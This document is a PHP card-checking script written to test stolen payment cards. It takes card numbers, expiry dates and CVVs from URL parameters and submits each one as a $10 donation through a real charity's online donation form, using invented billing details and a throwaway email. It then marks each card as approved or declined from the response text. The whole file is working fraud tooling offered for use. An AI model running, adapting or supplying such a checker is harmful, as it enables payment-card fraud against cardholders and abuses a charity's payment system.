<?php

set_time_limit(0);
error_reporting(0);

extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];


function doPost($url,$data,$headers){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

if(!empty($data)){
	curl_setopt($ch, CURLOPT_POSTFIELDS,$data);
	curl_setopt($ch, CURLOPT_POST,1);
}

if(!empty($headers)){
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
}

return curl_exec($ch);

}

function getToken($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function getBrand($card){
	$brand = '';
	if($card[0] == 5){
		$brand = 'ECMC';
	}else if($card[0] == 4){
		$brand = 'VISA';
	}else{
		$brand =  "Reprobada";
	}

return $brand;
}

function formatMes($mess){
$m = $mess;
	if(strlen($mess) == 2 && $mess <> 10 && $mess <> 11 && $mess <> 12){
		$m = str_replace('0','',$mess);
	}else{
		return $m;
	}

return $m;
}

$mes = formatMes($mes);

$r =  doPost("https://secure2.convio.net/unfpa/site/Donation2","user_donation_amt=%2410.00&company_min_matching_amt=&currency_locale=en_US&level_flexibleexpandedsubmit=true&level_flexibleexpandedsubmit=true&level_flexibleexpandedsubmit=true&level_flexibleexpandedsubmit=true&level_flexibleexpandedsubmit=true&level_flexibleexpanded=2027&level_flexibleexpanded2027amount=%2410.00&level_flexibleexpandedsubmit=true&level_flexiblesubmit=true&level_flexiblegift_type=1&level_flexiblegift_typesubmit=true&level_flexibledurationsubmit_skip=true&matching_giftsubmit=true&donor_employername=&donor_employersubmit=true&billing_first_namename=Peter&billing_first_namesubmit=true&billing_last_namename=Saterin&billing_last_namesubmit=true&billing_addr_street1name=Street+1234&billing_addr_street1submit=true&billing_addr_street2name=&billing_addr_street2submit=true&billing_addr_cityname=$city&billing_addr_citysubmit=true&billing_addr_state=$state&billing_addr_statesubmit=true&billing_addr_zipname=$zipcode&billing_addr_zipsubmit=true&billing_addr_country=$country&billing_addr_countrysubmit=true&donor_email_addressname=covobaha%40g-mailix.com&donor_email_addresssubmit=true&donor_email_opt_insubmit=true&responsive_payment_typepay_typeradio=credit&responsive_payment_typepay_typeradiosubmit=true&responsive_payment_typecc_typesubmit=true&responsive_payment_typecc_numbername=$cc&responsive_payment_typecc_numbersubmit=true&responsive_payment_typecc_exp_date_MONTH=$mes&responsive_payment_typecc_exp_date_YEAR=$ano&responsive_payment_typecc_exp_date_DAY=1&responsive_payment_typecc_exp_datesubmit=true&responsive_payment_typecc_cvvname=$cvv&responsive_payment_typecc_cvvsubmit=true&responsive_payment_typesubmit=true&tribute_show_honor_fieldssubmit=true&tribute_type=&tribute_typesubmit_skip=true&tribute_honoree_namename=&tribute_honoree_namesubmit_skip=true&send_ecardsubmit=true&stationery_layout_chooser=true&stationery_layout_id=1201&select_gridsubmit=true&ecard_recpientsname=&ecard_recpientssubmit=true&tribute_ecard_subjectname=&tribute_ecard_subjectsubmit=true&tribute_ecard_messagename=&tribute_ecard_messagesubmit=true&nullsubmit=true&preview_buttonsubmit=true&e_card_copy_sendersubmit=true&pstep_finish=Process&idb=204713667&df_id=1523&mfc_pref=T&1523.donation=form1");

//echo $r;
//exit();

if (strpos($r, 'The credit card was declined. Please check the information that you entered')) {
        echo '<span class="label label-danger">#Reprovada ❌ This transaction has been declined '.$lista.' #nic0la 7esla<br></span>';
}else if(strpos($r, 'There was a problem processing your request.')) {
			echo '<span class="label label-danger">#Reprovada ❌ There was a problem processing your request '.$lista.' #nic0la 7esla<br></span>';
			
		}else{
			echo '<span class="label label-success">#Aprovada ✅ Another message'.$lista.' #nic0la 7esla</span> <br>';
		}

?>
